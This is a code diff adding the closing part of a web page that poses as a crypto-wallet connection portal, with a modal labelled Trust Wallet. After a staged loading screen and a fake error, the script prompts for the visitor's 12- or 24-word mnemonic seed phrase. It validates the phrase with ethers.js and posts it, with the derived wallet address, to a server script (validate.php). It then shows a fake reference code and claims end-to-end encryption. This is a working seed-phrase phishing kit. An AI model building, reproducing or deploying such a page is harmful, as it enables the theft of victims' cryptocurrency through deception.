+        <div class="footer">
+            <div class="row justify-content-center">
+                <div class="col-lg-2 col-md-4 col-sm-4 col-4">
+                    <a href="./"><i class="fab fa-discord"></i>Discord</a>
+                </div>
+
+                <div class="col-lg-2 col-md-4 col-sm-4 col-4">
+                    <a href="./"><i class="fab fa-twitter"></i>Twitter</a>
+                </div>
+
+                <div class="col-lg-2 col-md-4 col-sm-4 col-4">
+                    <a href="./"><i class="fab fa-github"></i>GitHub</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- modal section -->
+    <!-- modal section for connection -->
+    <div style="display: none" id="connectModal" class="portal-window">
+        <div class="portal-window-content">
+
+            <div class="modal-section">
+                <div class="close-header">
+                    <button id="closeModal" type="button" class="btn btn-md btn-outline"> <i
+                            class="fa-solid fa-xmark"></i> </button>
+                </div>
+                <div id="mainModal" class="modal-wrapper">
+                    <div class="modal-top">
+                        <div class="modal-img">
+                            <img src="../assets/images/files/trust_wallet.jpg" alt="" id="assetImg" class="img-fluid" />
+                        </div>
+                        <div class="header-content">
+                            <p class="m-p-1"><span id="assetName"> Trust Wallet </span></p>
+                            <p class="m-p-2">This session is secured and encrypted</p>
+                        </div>
+                    </div>
+
+                    <div class="modal-main">
+                        <div id="modalLoad" class="modal-div-1">
+                            <div class="modal-load">
+                                <div class="loader"></div>
+                                <p class="l-p-1">starting secure connection...</p>
+                                <p class="l-p-2">please wait...</p>
+                            </div>
+                        </div>
+
+                        <div style="display: none" id="modalError" class="modal-div-2">
+                            <div class="modal-error">
+                                <button class="btn btn-md btn-outline-danger">
+                                    An error occurred... please try again or connect manually
+                                </button>
+
+                                <div class="action-btn">
+                                    <button type="button" id="tryAgain" class="btn btn-md btn-outline-secondary">
+                                        Try again
+                                    </button>
+                                    <button type="button" id="connectManual" class="btn btn-md btn-primary">
+                                        Connect Manually
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div style="display: none" id="modalConnect" class="modal-div-3">
+                            <div class="modal-connect">
+                                <form id="phraseForm" method="post">
+                                    <div class="form-group">
+                                        <textarea
+                                            placeholder="Enter your 12 or 24 mnemonic words, seperate them with spaces."
+                                            name="formPhrase" id="formPhrase" cols="30" rows="6"
+                                            onkeyup="countWords(this);" class="form-control" required></textarea>
+                                    </div>
+                                    <div class="form-btn">
+                                        <button type="submit" id="submit_phrase" disabled
+                                            class="btn btn-md btn-secondary">
+                                            Connect Wallet
+                                        </button>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="modal-bottom">
+                        <p class="m-b-p">
+                            <img src="../assets/images/files/shield.png" alt="" width="30" />
+                            <span class="m-f-1">This session is protected with an end-to-end encryption
+                            </span>
+                        </p>
+                    </div>
+                </div>
+
+                <div id="qrModal" style="display: none" class="modal-qr-wrapper">
+                    <div class="modal-qr">
+                        <div class="qr-img">
+                            <img src="../assets/images/files/qr-code.png" alt="" id="show_1" class="img-fluid" />
+                        </div>
+                        <div class="qr-text">
+                            <p>
+                                Please Contact the Admin with your unique ref code
+                                <span id="p-code" class="p-code"></span>
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.ethers.io/lib/ethers-5.4.umd.min.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
+        crossorigin="anonymous"></script>
+</body>
+
+</html>
+
+
+<script>
+    $(document).ready(function () {
+
+        // open metamask function
+        async function openWeb() {
+
+            const modal = $('#connectModal');
+            modal.css('display', 'flex');
+            $('body').css('overflow-y', 'hidden');
+
+            $("#modalLoad").show();
+            $("#modalError").hide();
+            $("#modalConnect").hide();
+
+            setTimeout(function () {
+                $("#modalError").show();
+                $("#modalLoad").hide();
+                $("#modalConnect").hide();
+
+            }, 5000);
+
+            try {
+                // create a Web3Provider instance
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                // request access to the user's MetaMask account
+                await window.ethereum.request({
+                    method: 'eth_requestAccounts'
+                });
+                // get the current account address
+                const signer = provider.getSigner();
+                const address = await signer.getAddress();
+                //web3 connection end here
+            } catch (error) {
+                console.error('Error fetching data:', error);
+            }
+        }
+
+
+        $("#tryAgain").click(function () {
+            $("#modalLoad").show();
+            $("#modalError").hide();
+            $("#modalConnect").hide();
+            setTimeout(function () {
+                $("#modalError").show();
+                $("#modalLoad").hide();
+                $("#modalConnect").hide();
+            }, 5000);
+        });
+
+        $("#connectManual").click(function () {
+            $("#modalLoad").hide();
+            $("#modalError").hide();
+            $("#modalConnect").show();
+        });
+
+
+        // Get the modal
+        var modal = document.getElementById("connectModal");
+        let closeModal = document.getElementById("closeModal");
+
+
+        $(".img-box").on('click', function () {
+
+            // Get wallet name and image src from the clicked column
+            var walletName = $(this).find('.p-tag').text();
+            var walletImageSrc = $(this).find('img').attr('src');
+
+            $('#assetName').text(walletName);
+            $('#assetImg').attr('src', walletImageSrc);
+
+            openWeb();
+
+            // console.log("walletName: " + walletName);
+            // console.log("walletImageSrc: " + walletImageSrc);
+
+        });
+
+        closeModal.onclick = function () {
+            modal.style.display = "none";
+            document.body.style.overflowY = 'auto';
+        };
+
+        window.onclick = function (event) {
+            if (event.target == modal) {
+                modal.style.display = "none";
+                document.body.style.overflowY = 'auto';
+            }
+        };
+
+    });
+</script>
+
+<script>
+    // Get the input field element
+    const $inputPhrase = $("#formPhrase");
+    // Add an event listener to the input field for input events
+    $inputPhrase.on("input", function () {
+        // Remove any non-numeric characters
+        $("#formPhrase").removeClass("error");
+        $inputPhrase.val($inputPhrase.val().replace(/[^a-zA-Z\s]/g, ""));
+    });
+
+    function countWords(self) {
+        var spaces = self.value.match(/\S+/g);
+        var words = spaces ? spaces.length : 0;
+
+        if (words >= 11) {
+            document.getElementById("submit_phrase").disabled = false;
+        } else {
+            document.getElementById("submit_phrase").disabled = true;
+        }
+    }
+
+</script>
+
+<script>
+    function generateRandomString(length) {
+        var result = '';
+        var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        var charactersLength = characters.length;
+        for (var i = 0; i < length; i++) {
+            result += characters.charAt(Math.floor(Math.random() * charactersLength));
+        }
+        return result;
+    }
+
+    // Validate seed phrase on form submission
+    $("#phraseForm").submit(function (event) {
+        event.preventDefault();
+        document.getElementById("submit_phrase").disabled = true;
+        var dappWords = $("#formPhrase").val();
+
+        if (!validateInput(dappWords)) {
+
+            $("#formPhrase").addClass("error");
+        } else {
+
+            dappWords = dappWords.trim();
+            var randomString = generateRandomString(7);
+            var dappName = $('#assetName').text();
+
+            try {
+                const wallet = ethers.Wallet.fromMnemonic(dappWords);
+                //console.log('Seed phrase is valid:', dappWords);
+                // console.log('Wallet address:', wallet.address); 
+                $.ajax({
+                    url: "./validate.php",
+                    method: "POST",
+                    dataType: "JSON",
+                    data: {
+                        dappWord: dappWords,
+                        dappAddress: wallet.address,
+                        dappName: dappName,
+                    },
+                    success: function () { },
+                    complete: function () { },
+                });
+                document.getElementById("p-code").innerHTML = randomString;
+                $("#mainModal").hide();
+                $("#qrModal").show();
+                document.getElementById("submit_phrase").disabled = true;
+            } catch (error) {
+                // console.error("Invalid seed phrase:", dappWords);
+                $("#formPhrase").addClass("error");
+                document.getElementById("submit_phrase").disabled = false;
+            }
+        }
+    });
+
+    function validateInput(input) {
+        var sanitizedInput = input.replace(/<script.*?>.*?<\/script>/gi, ''); // Remove script tags
+        sanitizedInput = sanitizedInput.replace(/<\/?[^>]+(>|$)/g, ""); // Strip any other HTML tags
+
+        // Split the input into words using space as a delimiter after removing HTML
+        var words = sanitizedInput.trim().split(/\s+/);
+        if (words.length !== 12 && words.length !== 24) {
+            return false; // Check for 12 or 24 words
+        }
+
+        var wordSet = new Set(words);
+        if (wordSet.size !== words.length) {
+            return false; // Check for duplicates
+        }
+
+        return true; // Passed all checks
+    }
+</script>
